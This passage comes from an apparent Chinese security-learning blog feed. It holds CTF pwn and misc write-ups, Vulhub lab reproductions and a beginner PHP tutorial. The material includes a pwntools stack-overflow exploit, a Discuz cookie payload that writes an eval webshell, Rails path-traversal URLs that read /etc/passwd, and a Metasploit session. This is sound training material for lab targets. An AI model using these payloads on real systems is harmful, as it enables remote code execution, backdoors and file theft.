class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is something amazing here, do you know anything?"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Maybe I will tell you next time !"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在gets函数，栈溢出漏洞</p><p>找一下有没有后门函数：</p><p><img src="https://s2.loli.net/2022/12/07/EBqIiSLzMycNbZJ.png" alt="image.png"></p><p><code>/bin/sh</code>地址：0x0804863A</p><p>控制程序返回0x0804863A就可以拿到shell.</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先看一下变量s：</p><p><img src="https://s2.loli.net/2022/12/07/GDcKFTvPhAo2j7W.png" alt="image.png"></p><p>先确定能够控制的内存起始地址距离main函数返回地址的字节数。</p><p>如上图，该字符串通过esp进行索引。</p><p>进入gdb：</p><pre><code class="hljs">b *0x080486AEr</code></pre><p>在call处下断点，运行,查看esp和ebp</p><p><img src="https://s2.loli.net/2022/12/07/9YyXFofLGH1iQsk.png" alt="image.png"></p><p>esp: 0xffffd480</p><p>ebp: 0xffffd508</p><p>根据代码</p><p><img src="https://s2.loli.net/2022/12/07/AZtbInzKYoFxVBP.png" alt="image.png"></p><p>(R一下就会变成1C了)</p><p>可知，s相对于esp的索引为<code>esp+1C</code></p><p>则s地址为：</p><pre><code class="hljs">0xffffd480 + 0x1C = 0xffffd49c</code></pre><p>s相对于ebp的偏移为：</p><pre><code class="hljs">0xffffd508 - 0xffffd49c = 0x6C</code></pre><p>s相对于返回地址的偏移为：</p><pre><code class="hljs">0x6C+4</code></pre><p>所以：</p><pre><code class="hljs">payload='a'*0x6C+'b'*4+p32(0x0804863A)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./ret2text')sys=0x0804863apayload='a'*0x6C+'b'*4+p32(sys)p.sendlines(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/07/6hJBfwvXo9ky23P.png" alt="image.png"></p><p>呜呜呜感觉终于对pwn稍微稍微的有了那么一点点头绪哭了哭了</p>]]></content>
    
    
    
    <tags>
      
      <tag>ROP</tag>
      
      <tag>栈溢出</tag>
      
      <tag>CTFWikiPWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 PWN-200</title>
    <link href="/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/"/>
    <url>/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>拿到题目先查一下保护：</p><p><img src="https://s2.loli.net/2022/12/05/YHz4qNbSylvX3dI.png" alt="image.png"></p><p>32位，没开栈保护和PIE；开了NX,可不执行内存可以用rop；</p><p>Partial RELRO - got表可写</p><p>扔进IDA看一下：</p><p>主函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+2Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">strcpy</span>(buf, "Welcome to XDCTF2015~!\n");<br>  <span class="hljs-built_in">memset</span>(&amp;buf[<span class="hljs-number">24</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x4Cu);<br>  <span class="hljs-built_in">setbuf</span>(stdout, buf);<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, buf, strlen(buf));<br>  <span class="hljs-built_in">sub_8048484</span>();<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>sub_8048484()函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">sub_8048484</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">setbuf</span>(stdin, buf);<br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>}<br></code></pre></td></tr></tbody></table></figure><p>此处存在栈溢出，buf最多只有6Ch,但read读入了0x100的大小。</p><h1 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h1><ol><li>有read(),write(),无system()</li><li>在函数sub_8048484()中存在栈溢出</li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>通过栈溢出调用write()函数泄露write()对应的got表内容，此处将write()函数的返回地址设置为main或sub_8048484()的地址以便再次利用栈溢出漏洞</li><li>通过LibcSearcher获取libc版本</li><li>获取system函数，<code>'/bin/sh'</code>地址</li><li>再次利用栈溢出漏洞执行system函数</li></ol><h2 id="LibcSearcher安装"><a href="#LibcSearcher安装" class="headerlink" title="LibcSearcher安装"></a>LibcSearcher安装</h2><pre><code class="hljs">git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop</code></pre><p>一般使用方法：</p><pre><code class="hljs">libc = LibcSearcher("gets",gets_real_addr)libcbase = gets_real_addr – obj.dump("fgets")system_addr = libcbase + obj.dump("system")            #system 偏移bin_sh_addr = libcbase + obj.dump("str_bin_sh")         #/bin/sh 偏移</code></pre><p>参考：<br><a href="https://blog.csdn.net/qq_44108455/article/details/105458234">https://blog.csdn.net/qq_44108455/article/details/105458234</a></p><p><a href="https://blog.csdn.net/shanwei274/article/details/115529108">https://blog.csdn.net/shanwei274/article/details/115529108</a></p><ul><li>DynELF：pwntools中用于针对没有给libc情况的漏洞利用模块，一般用puts和write函数来泄露libc地址。</li><li>DynELF使用要求：<ul><li>漏洞可以泄露libc地址</li><li>漏洞可以反复利用</li></ul></li></ul><p>有关DynELF使用的文章：<br><a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows下搭建蚂蚁笔记(待补充)</title>
    <link href="/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>环境：Windows 10</p><h1 id="安装MongoDB及附带工具包"><a href="#安装MongoDB及附带工具包" class="headerlink" title="安装MongoDB及附带工具包"></a>安装MongoDB及附带工具包</h1>]]></content>
    
    
    
    <tags>
      
      <tag>搭建环境</tag>
      
      <tag>蚂蚁笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界CTF-Misc</title>
    <link href="/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/"/>
    <url>/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/</url>
    
    <content type="html"><![CDATA[<p>不想学习……所以来做几个杂项</p><h1 id="真是阳间题"><a href="#真是阳间题" class="headerlink" title="真是阳间题"></a>真是阳间题</h1><p>下载打开是一串数字，也不是十六进制，搜了一下不知道啥加密，看wp之后发现要十转十六再转文本，得到：</p><pre><code class="hljs">====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</code></pre><p>等号明显是Base，倒过来得到：</p><pre><code class="hljs">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====</code></pre><p>脚本：</p><pre><code class="hljs">str="====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI"result=str[::-1]print(result)</code></pre><p>base32解码得<code>FQARD{L0u_W0s_yp3_4_k4qrcp_0d_apwnr0}</code></p><p>还是不对，应该是移位，尝试凯撒密码，移位2，加密得：</p><pre><code class="hljs">HSCTF{N0w_Y0u_ar3_4_m4ster_0f_crypt0}</code></pre><h1 id="我们的秘密是绿色的"><a href="#我们的秘密是绿色的" class="headerlink" title="我们的秘密是绿色的"></a>我们的秘密是绿色的</h1><p>开局一张绿图，没找到隐写，看wp。</p><p>使用工具oursercert,密码是日历上的绿体字日期数字：0405111218192526</p><p>压缩包有密码，双击看到提示：</p><p><img src="https://s2.loli.net/2022/11/30/3HESYB9badDMGgl.png" alt="image.png"></p><p>搜了一下coffee的生日，啥玩意儿不对，开始爆破拿到密码：19950822</p><p><img src="https://s2.loli.net/2022/11/30/irIZQVxCjvu7GFL.png" alt="image.png"></p><p>打开看了以下txt：</p><p><img src="https://s2.loli.net/2022/11/30/NuWTbAvJMqXd5wB.png" alt="image.png"></p><p>6</p><p>打开flag，又是加密，意料之中。</p><p><img src="https://s2.loli.net/2022/11/30/O5fPrnXxiWUgZqm.png" alt="image.png"></p><p>又爆破？</p><p>试了，不行，遇事不决看wp。</p><p>明文攻击：把readme.txt压缩成zip文件，然后用ARCHPR明文攻击：</p><p><img src="https://s2.loli.net/2022/11/30/waJG7Eqj5Wdo2KV.png" alt="image.png"></p><pre><code class="hljs">Y29mZmVl</code></pre><p>打开，竟然还有一层压缩解密……这边只能单走一个6</p><p>伪加密，没碰到过，去学一下：</p><p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768" title="CTF——zip伪加密">https://blog.csdn.net/xiaozhaidada/article/details/124538768</a></p><p>我winhex过期了，懒得弄，看一下网上的分析：</p><p>把504B0304后的第3、4个byte改成0000还有把504B0102后的第5、6个byte改成0000即可破解伪加密</p><p>或者用7z也能看（我不下，那玩意太流氓了）</p><p>得到密文：<code>qddpqwnpcplen%prqwn_{_zz*d@gq}</code></p><p>栅栏密：</p><pre><code class="hljs">qwlr{ddneq_@dpnwzgpc%nzqqpp_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/ZxpkOcD2PjitIzH.png" alt="image.png"></p><p>凯撒：</p><pre><code class="hljs">flag{ssctf_@seclover%coffee_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/WAOCXHulKFnpz1R.png" alt="image.png"></p><p>这他妈谁能想到，请暴打出题人！！！！</p><h1 id="Miscellaneous-200"><a href="#Miscellaneous-200" class="headerlink" title="Miscellaneous-200"></a>Miscellaneous-200</h1><p><img src="https://s2.loli.net/2022/12/01/GzgH6NE41opeYxk.png" alt="image.png"></p><p>题目打开就是这，百度了一下有没有类似的加密方式，没找到</p><p>说实话，看到这个255，255，255.本人下意识就想到了那个RGB颜色数值，但是还是不得其解，遂看wp。</p><p>还原图片：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from ast import literal_eval<br>from PIL import Image<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'C:\\flag.txt'</span>, <span class="hljs-string">'r'</span>)<br>corl = <span class="hljs-selector-attr">[literal_eval(line) for line in f.readlines()]</span><br>f<span class="hljs-selector-class">.close</span>()<br><span class="hljs-selector-tag">img</span> = Image<span class="hljs-selector-class">.new</span>(<span class="hljs-string">'RGB'</span>, (<span class="hljs-number">270</span>, <span class="hljs-number">270</span>), <span class="hljs-string">'#ffffff'</span>)<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>   <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>      <span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.putpixel</span> (<span class="hljs-selector-attr">[i , j]</span>, corl<span class="hljs-selector-attr">[k]</span>)<br>      k=k+<span class="hljs-number">1</span><br><span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.save</span>(<span class="hljs-string">"flag.png"</span>)<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/12/01/H9yl7vRUsnrSXiB.png" alt="image.png"></p><p>这是什么扭曲的文字，嗯？</p><pre><code class="hljs">flag{ youc@n'tseeme }</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>攻防世界</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulhub之wooyun-2010-080723</title>
    <link href="/2022/11/28/vulhub%EF%BC%9Awooyun-2010-080723/"/>
    <url>/2022/11/28/vulhub%EF%BC%9Awooyun-2010-080723/</url>
    
    <content type="html"><![CDATA[<p>完全看不懂，所以先跟着其他文章走一遍，以后再回顾。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>由于php5.3x版本里php.ini的设置里request_order默认值为GP,导致REQUEST中不再包含_COOKIE，我们通过在cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>影响版本：<code>Discu 7.x  6.x</code></p><p>数据库地址：db</p><p>数据库名：discuz</p><p>数据库用户名及密码：root</p><p>管理员账号：admin</p><p>管理员密码：root</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>安装完成后，找一个帖子抓包，将cookie改成：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>成功执行<code>phpinfo();</code></p><p><img src="https://s2.loli.net/2022/11/28/UOwgudGJy9qZDjN.png" alt="image.png"></p><p>写入webshell，将cookie改为：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))&lt;?php @eval($_POST[pwd])?&gt;</code></pre><p><img src="https://s2.loli.net/2022/11/28/inc7KuRSVGBFC1N.png" alt="image.png"></p><p>蚁剑连接：</p><p>ip：/x.php</p><p>密码：pwd</p><p><img src="https://s2.loli.net/2022/11/28/ujskDg95xNdHbC6.png" alt="image.png"></p><p>getshell</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><ol><li>如php中的<code>system、exec、shell_exec、passthru、proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将而已系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</li><li><code>$GLOBALS</code> 引用全局作用域中可用的全部变量；关联数组array，包含当前脚本内定义成全局范围的所有变量的引用。数组的键就是变量的名字。</li><li>chr()码值表：返回值是当前整数对应的ASCII字符</li></ol><p>参考文章：</p><p><a href="https://www.cnblogs.com/cute-puli/p/13333991.html">https://www.cnblogs.com/cute-puli/p/13333991.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>vulhub</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulhub之 CVE-2018-3760</title>
    <link href="/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/"/>
    <url>/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/</url>
    
    <content type="html"><![CDATA[<p>先搜一下3760的形成原理：</p><p>Ruby on Rails 路径穿越；</p><p>高危；</p><p>影响版本： 版本&lt;=Sprockets 3.7.1</p><p>Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用<code>%25e%25e/</code>来跨越到就根目录，读取或执行目标服务器上任意文件。</p><p>Sprockets是一个用于编译和提供Web Assets 的Ruby库。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>目的：利用已知漏洞读取文件passwd。</p><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:///etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/buyhqXf96nOvz7L.png" alt="image.png"></p><p>直接在url后门进行文件包含，<code>/</code>被过滤，换成url编码重新访问试试：</p><pre><code class="hljs">/ 的URL编码为%2fhttp://192.168.218.145:3000/assets/file:%2f%2f/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/Bx4FSePLzYXZ8yR.png" alt="image.png"></p><p>因为<code>/etc/passwd</code>在不允许的目录中，但在报错页面给出了允许的目录列表。</p><p>随意选一个，用<code>.../.../</code>的办法向上跳转读取<code>/etc/passwd</code></p><pre><code class="hljs">" . "  url编码为%2e,二次编码为%252e</code></pre><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/xH7t5konC8ifu9h.png" alt="image.png"></p><p>参考文章</p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121845115">https://blog.csdn.net/qq_51524329/article/details/121845115</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>vulhub</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub之CVE-2019-5418</title>
    <link href="/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/"/>
    <url>/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png" alt="image.png"></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Ruby on Rails是一个Web应用程序框架，构建在Ruby语言上。</p><p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。</p><p>通过传入<code>Accept:../../../../../../../etc/passwd\{\{</code> 头来构造路径穿越漏洞，读取任意文件。</p><h2 id="漏洞利用方法一"><a href="#漏洞利用方法一" class="headerlink" title="漏洞利用方法一"></a>漏洞利用方法一</h2><p>访问index.php（随便输入的）报错，报错页面有个<code>robots</code>路径。</p><p><img src="https://s2.loli.net/2022/11/24/ZVbqw63aJUHlmk8.png" alt="image.png"></p><p>访问一下：</p><p><img src="https://s2.loli.net/2022/11/24/8p9YzNMK2vejF64.png" alt="image.png"></p><p>不知道，抓包看看：</p><p><img src="https://s2.loli.net/2022/11/24/XRMlnKUzOFqZjNk.png" alt="image.png"></p><p>修改Accept:</p><p><img src="https://s2.loli.net/2022/11/24/VK1SO7xEFPI2kca.png" alt="image.png"></p><p>成功读取<code>/etc/passwd</code></p><h2 id="漏洞利用方法二"><a href="#漏洞利用方法二" class="headerlink" title="漏洞利用方法二"></a>漏洞利用方法二</h2><p>利用kali中的MSF进行漏洞利用</p><pre><code class="hljs">msfconsole # 启动search rails # 查找rails相关模块use 4 #选择模块</code></pre><p><img src="https://s2.loli.net/2022/11/24/siNFGewlkHa38YM.png" alt="image.png"></p><pre><code class="hljs">show options # 展示配置选项</code></pre><p><img src="https://s2.loli.net/2022/11/24/HUrDNV1AJjtawxq.png" alt="image.png"></p><p>设置Rhost,rport,route参数，直接run运行后成功拿到meterpreter。</p><p><img src="https://s2.loli.net/2022/11/24/Hy1FaMBGNERCZDb.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>vulhub</tag>
      
      <tag>靶场</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php学习</title>
    <link href="/2022/11/23/php%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/23/php%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="网站基本概念"><a href="#网站基本概念" class="headerlink" title="网站基本概念"></a>网站基本概念</h1><ol><li>服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）<ol><li>web服务器：提供web服务（网站访问），需要安装web服务软件，Apache,tomcat,iis等</li></ol></li><li>IP：网络互连协议，为计算机网络相互连接进行通信而设计的协议，IP地址具有唯一性（每台电脑都有一个唯一的IP地址）</li><li>域名：由遗传用点分割的名字组成（<code>www.baidu.ccom</code>）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位，一个域名的目的是便于记忆和沟通的一组服务器的地址。<ol><li>特殊IP:<code>127.0.0.1</code> 代表本机</li><li>特殊域名：<code>localhost.com</code></li></ol></li><li>DNS:域名系统，作为域名和IP地址相互映射的一个分布式数据库，使用户更方便的访问互联网，通过主机名，得到该主机名对应的IP地址的过程叫做域名解析。<ol><li><code>用户输入域名 localhost -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑</code></li></ol></li><li>端口：(port) 设备与外界通讯交流的出口，分为虚拟端口和物理端口<ol><li>虚拟端口：指计算机内部或交换机路由器内的端口，不可见，如80端口、21、23等；</li><li>物理端口：又称为接口，时可见接口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口<br> 3.<code>用户输入域名 localhost:端口 -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 -&gt; 软件（服务）</code></li></ol></li></ol><h1 id="Web程序的访问流程"><a href="#Web程序的访问流程" class="headerlink" title="Web程序的访问流程"></a>Web程序的访问流程</h1><p>web分为两类：静态网站和动态网站</p><p>浏览器发起访问-&gt; DNS解析域名-&gt; 服务器电脑-&gt; 服务软件</p><h2 id="静态网站的访问"><a href="#静态网站的访问" class="headerlink" title="静态网站的访问"></a>静态网站的访问</h2><p>访问<code>http://localhost:80/index.html</code></p><p><img src="https://s2.loli.net/2022/11/15/9Zne3TXqFwEQaxY.png" alt="image.png"></p><h2 id="动态网站访问"><a href="#动态网站访问" class="headerlink" title="动态网站访问"></a>动态网站访问</h2><p>与静态类似，但比静态多出两个内容：服务器端解析、数据库。</p><p>访问<code>http://localhost:80/index.php</code></p><p><img src="https://s2.loli.net/2022/11/15/raP1p2C7BzXuUWI.png" alt="image.png"></p><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>安个phpstudy就行了</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>php是一种运行在服务器端的脚本语言，可以嵌入到html中</p><h1 id="php代码标记"><a href="#php代码标记" class="headerlink" title="php代码标记"></a>php代码标记</h1><pre><code class="hljs">ASP标记： &lt;%php代码 %&gt; # 已弃用短标记： &lt;?php代码?&gt; # 已弃用脚本标记： &lt;script language="php"&gt;php代码&lt;/script&gt;//----------------------例子：&lt;html&gt;    &lt;body&gt;        &lt;b&gt;            &lt;script language="php"&gt;                //脚本标记                echo 'hello world';            &lt;/script&gt;        &lt;/b&gt;    &lt;/body&gt;&lt;/html&gt;//-----------------------------标准标记（常用）： &lt;?php php代码?&gt;</code></pre><h1 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h1><p>行注释： <code>//</code></p><p>块注释： <code>/*…*/</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//注释</span><br><span class="hljs-comment">/* balbala</span><br><span class="hljs-comment">balaba</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello world!"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h1 id="语句分隔符"><a href="#语句分隔符" class="headerlink" title="语句分隔符 ;"></a>语句分隔符 <code>;</code></h1><ol><li>php中标记结束符<code>?&gt;</code>有自带语句结束符效果，最后一行php代码可以没有语句结束符。</li><li>php中很多代码书写并不是嵌入到html中，而是单独存在，通常书写习惯中不建议使用标记结束符，php会自动从开始到最后全部认为是php代码。</li></ol><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>基本概念：用于存储数据，存在名字，可以通过名字访问数据，可以改变数据</p><p>php中所有变量都必须使用<code>$</code>符号。</p><p>删除变量：<code>unset()</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//变量</span><br>    <span class="hljs-comment">//定义变量：在php中不需要任何关键字定义变量(赋值)</span><br><span class="hljs-variable">$var1</span>; <span class="hljs-comment">//定义变量</span><br><span class="hljs-variable">$var2</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">//定义同时赋值</span><br><span class="hljs-comment">//访问变量</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span>;<br><span class="hljs-comment">//修改变量</span><br><span class="hljs-variable">$var2</span>=<span class="hljs-number">2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;hr/&gt;'</span>,<span class="hljs-variable">$var2</span>; <span class="hljs-comment">//hr是一个横线</span><br><span class="hljs-comment">//删除变量unset()</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$var2</span>);<br><span class="hljs-comment">//echo $var2;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h2><ol><li>在php中变量以<code>$</code>符号开始</li><li>名字由字母、数字、下划线构成，不能以数字开头</li><li>php中本身允许中文变量(不建议)</li></ol><p>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据(预定义变量都是数组)</p><pre><code class="hljs">$_GET: 获取所有表单以get方式提交的数据$_POST: POST提交的数据都会保存在此$_REQUEST: GET和POST提交的都会保存$GLOBALS: PHP中所有的全局变量$_SERVER: 服务器信息$_SESSION: session会话数据$_COOKIE: cookie会话数据$_ENV: 环境信息$_FILES: 用户上传的文件信息</code></pre><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值，在变量前面再多加一个<code>$</code>符号。</p><pre><code class="hljs">$a='b';$b='bb';echo $a;echo $$a;</code></pre><h2 id="变量传值"><a href="#变量传值" class="headerlink" 